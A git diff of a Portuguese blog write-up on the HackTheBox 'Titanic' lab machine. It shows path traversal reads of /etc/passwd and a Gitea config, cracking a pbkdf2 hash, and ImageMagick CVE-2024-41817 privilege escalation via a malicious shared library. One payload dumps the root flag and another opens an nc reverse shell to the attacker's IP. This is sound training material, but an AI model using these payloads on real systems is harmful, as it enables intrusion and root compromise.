@@ -1,8 +1,13 @@
 ---
 title: Titanic HTB Write-up
 created: 2025-06-28 22:57
-tags: [hackthebox, ctf, pathtraversal, gitea, imagemagick]
-draft: true
+tags:
+  - hackthebox
+  - ctf
+  - pathtraversal
+  - gitea
+  - imagemagick
+draft: false
 ---
 
 # Subtítulo da horinha
@@ -13,7 +18,7 @@ draft: true
 
 Olá mundo! Sejam todos bem vindos à mais uma aventura em minha jornada pelo mundo da cibersegurança. Hoje vamos falar sobre `Titanic`, uma máquina de dificuldade classificada como fácil no [Hackthebox](https://www.hackthebox.com).
 
-Em `Titanic`, temos um site onde podemos fazer reserva para viajar no navio de mesmo nome, que é vulnerável à `Path Traversal`. Também temos um subdomínio com um repositório `gitea`, onde juntando à vulnerabilidade do site, podemos enumerar e conseguir credenciais válidas para conectar remotamente ao servidor via [[SSH]]. Para escalada de privilégios, nos aproveitamos de uma falha no programa `imagemagick`, cuja versão é vulnerável à `arbitrary command execution`.
+Em `Titanic`, temos um site onde podemos fazer reserva para viajar no navio de mesmo nome, que é vulnerável à `Path Traversal`. Também temos um subdomínio com um repositório `gitea`, onde juntando à vulnerabilidade do site, podemos enumerar e conseguir credenciais válidas para conectar remotamente ao servidor via [[SSH]]. Para escalada de privilégios, nos aproveitamos de uma falha no programa `imagemagick`, cuja versão é vulnerável à `CVE-2024-41817 Arbitrary Code Execution`.
 
 Isso soa bem interessante, então vamos começar!
 
@@ -23,7 +28,7 @@ Isso soa bem interessante, então vamos começar!
 
 ### Nmap
 
-O resultado do programa NMAP mostrou que havia apenas duas portas abertas.
+O resultado do programa [[NMAP]] mostrou que havia apenas duas portas abertas.
 
 ```bash
 PORT   STATE SERVICE REASON         VERSION
@@ -66,7 +71,7 @@ Depois de preencher todo o formulário, pude fazer o download da minha reserva e
 
 Mas o interessante é que o site aponta para `titanic.htb/download?ticket=<arquivo.json>` ao fazer o download. Isso me deu a idéia de testar se era vulnerável à `Path Traversal`. Usando a ferramenta `Curl`, pude confirmar a vulnerabilidade.
 
-```bash
+```bash {35}
 ┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Titanic]
 └─$ curl http://titanic.htb/download?ticket=../../../../../../../../etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -77,7 +82,7 @@ sync:x:4:65534:sync:/bin:/bin/sync
 games:x:5:60:games:/usr/games:/usr/sbin/nologin
 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
 uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
 proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
@@ -113,7 +118,7 @@ Além de confirmar o `Path Traversal`, também descobri um usuário válido com 
 
 Enquanto fazia esses testes manualmente, eu havia deixado a ferramenta `Ffuf` rodando em outro painel do `Tmux`. Ao verificar o resultado da varredura de subdomínios, havia encontrado um repositório gitea em `dev.titanic.htb`.
 
-```bash
+```bash {25}
 ┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Titanic]
 └─$ ffuf -w /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://titanic.htb -H "Host: FUZZ.titanic.htb" -ac
 
@@ -125,7 +130,7 @@ Enquanto fazia esses testes manualmente, eu havia deixado a ferramenta `Ffuf` ro
           \/_/    \/_/   \/___/    \/_/
 
        v2.1.0-dev
-________________________________________________
+________________________________________________ 
 
  :: Method           : GET
  :: URL              : http://titanic.htb
@@ -148,15 +153,15 @@ Adicionei o endereço `dev.titanic.htb` ao meu arquivo `/etc/hosts`  visitei a p
 
 Era um repositório `Gitea`, onde encontrei novas referências ao usuário `developer`. Em seu repositório, havia um arquivo de configuração do `Docker`, que indicava o caminho de inicialização do  `app.py`, aplicação de reservas do site `Titanic.htb`.
 
-O container era iniciado em `/home/developer/gitea/data` e isso acabou sendo confuso ao tentar encontrar o banco de dados. Porém, depois de ler a documentação do Gitea para docker, descobri que o arquivo de configuração estaria em `/home/developer/gitea/data/gitea/conf/app.ini`. Usando o `Path Traversal` consegui ler o conteúdo do arquivo.
+O container era iniciado em `/home/developer/gitea/data` e isso acabou sendo confuso ao tentar encontrar o banco de dados. Porém, depois de ler a documentação do `Gitea` para docker, descobri que o arquivo de configuração estaria em `/home/developer/gitea/data/gitea/conf/app.ini`. Usando o `Path Traversal` consegui ler o conteúdo do arquivo.
 
-```bash
+```bash {31}
 ┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Titanic]
 └─$ curl http://titanic.htb/download?ticket=../../../../../../../../home/developer/gitea/data/gitea/conf/app.ini
 APP_NAME = Gitea: Git with a cup of tea
 RUN_MODE = prod
 RUN_USER = git
-WORK_PATH = /data/gitea
+WORK_PATH = /data/gitea 
 
 [repository]
 ROOT = /data/git/repositories
@@ -275,12 +280,12 @@ O arquivo de configuração mostrou que o banco de dados estava em `/data/gitea/
 
 Usando o `Sqlite3`, consegui encontrar a hash do usuário `developer`.
 
-```bash
+```bash {63}
 ┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Titanic]
 └─$ sqlite3 gitea.db
 SQLite version 3.46.1 2024-08-13 09:16:08
 Enter ".help" for usage hints.
-sqlite> .tables
+sqlite> .tables 
 access                     oauth2_grant
 access_token               org_user
 action                     package
@@ -344,7 +349,7 @@ sqlite> select * from user;
 
 Ao tentar quebrar a senha com `John The Ripper`, percebi que o formato não era compatível. Ao ler o arquivo de configuração novamente, descobri que era o formato `pbkdf2`. Eu já tinha usado um script `Python` para quebrar esse formato na máquina `Compiled`. Então usei o mesmo script com pequenas modificações para descobrir a senha.
 
-```bash
+```bash {7,8}
 import hashlib
 import binascii
 from pwn import log
@@ -354,7 +359,7 @@ from pwn import log
 salt  = binascii.unhexlify('8bf3e3452b78544f8bee9400d6936d34')  # 16 bytes
 key   = 'e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56' 
 dklen = 50
-iterations = 50000
+iterations = 50000 
 
 
 def hash(password, salt, iterations, dklen):
@@ -453,31 +458,98 @@ developer@titanic:~$ cat user.txt
 
 ## Escalação de Privilégios
 
-Escalada de privilégios até o root
+Depois de vasculhar bastante pelos arquivos do servidor, encontrei um script interessante no diretório `/opt/scripts`.
+
+```bash title="identify_images.sh"
+cd /opt/app/static/assets/images
+truncate -s 0 metadata.log
+find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
+```
+
+O script faz uma busca recursiva por todos os arquivos `.jpg` do diretório, repassa o resultado para o programa `ImageMagick`  que vai descrever algumas informações sobre cada arquivo e salvar no arquivo `metadata.log`. O arquivo `metadata.log` vai aumentando a cada minuto o que significa que o script roda via `cronjob`. O arquivo também tem o usuário `root` como seu proprietário.
+
+Até aí parece inofensivo, porém ao verificar a versão do `ImageMagick` e pesquisar sobre alguma vulnerabilidade, encontrei um vetor para escalada de privilégios.
+
+```bash
+developer@titanic:/$ magick --version
+Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
+Copyright: (C) 1999 ImageMagick Studio LLC
+License: https://imagemagick.org/script/license.php
+Features: Cipher DPC HDRI OpenMP(4.5)
+Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
+Compiler: gcc (9.4)
+```
+
+A versão 7.1.1-35 do `ImageMagick` é vulnerável à `CVE-2024-41817-Arbitrary Code Execution` .
+
+> [!info] **CVE-2024-41817-Arbitrary Code Execution**
+> ImageMagick é um conjunto de software livre e de código aberto, usado para editar e manipular imagens digitais. A versão `AppImage` do `ImageMagick` pode usar um caminho vazio ao definir as variáveis de ambiente `MAGICK_CONFIGURE_PATH` e `LD_LIBRARY_PATH` durante a execução, o que pode levar à execução arbitrária de código ao carregar arquivos de configuração ou bibliotecas compartilhadas maliciosas no diretório de trabalho atual durante a execução do `ImageMagick`.
+
+Seguindo as instruções dessa [POC](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8), consegui ler a flag do usuário `root` após o script rodar novamente.
+
+```bash {12}
+developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+    system("cat /root/root.txt > /tmp/preacher.txt");
+    exit(0);
+}
+EOF
+developer@titanic:/opt/app/static/assets/images$ cat /tmp/preacher.txt
+c0319f9ea87c7398cd1820a1c1590dcc 
+```
+
+Será que dá para conseguir um shell reverso? É claro que sim!!
+
+```bash {22,23,29}
+# server side
+developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+    system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.6 9001 >/tmp/f");
+    exit(0);
+}
+EOF
+developer@titanic:/opt/app/static/assets/images$ 
+
+# kali machine
+┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Titanic]
+└─$ nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.11.55] 43488
+bash: cannot set terminal process group (740739): Inappropriate ioctl for device
+bash: no job control in this shell
+root@titanic:/opt/app/static/assets/images# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@titanic:/opt/app/static/assets/images# whoami
+whoami
+root
+root@titanic:/opt/app/static/assets/images# cat /root/root.txt
+cat /root/root.txt
+c0319f9ea87c7398cd1820a1c1590dcc 
+```
 
 ## Conclusão
 
-![[imagem.png | descrição da imagem]]
+![[TitanicFinal.png| Mesma imagem do início, porém agora está escrito: Titanic has been Pwned]]
 
-Palavras finais sobre o que aprendeu e CTA.
+Essa foi uma máquina bem divertida e desafiadora. Levou um tempo para conseguir encontrar o caminho do banco de dados do `Gitea`, mas depois disso as coisas fluíram melhor. E foi bem legal aprender sobre a vulnerabilidade no `ImageMagick`.
 
 ```mermaid
 flowchart TD
 	subgraph acesso inicial
-    A(acesso inicial) -->|CVE-2025-xxxx| B(www-data) 
-    B -->|db.php| C(user1)
+    A(Gitea Database) -->|Path Traversal| B(pbkdf2 hash) 
     end
     subgraph escalação de privilegios
-    C -->|exploit.sh| D(root)
-    C -->|portforward| E[web as root]
-    E -->|command execution| D(root)
+    B -->|pbkdf2 crack| C(developer user)
+    C -->|CVE-2024-41817| D(root)
     end
 ```
 
-Você pode usar links internos: [[outra-nota]]
-E inserir imagens: ![[imagem.png | descrição da imagem]]
-Ou blocos de código:
-
-```bash
-echo "Exemplo de comando"
-```
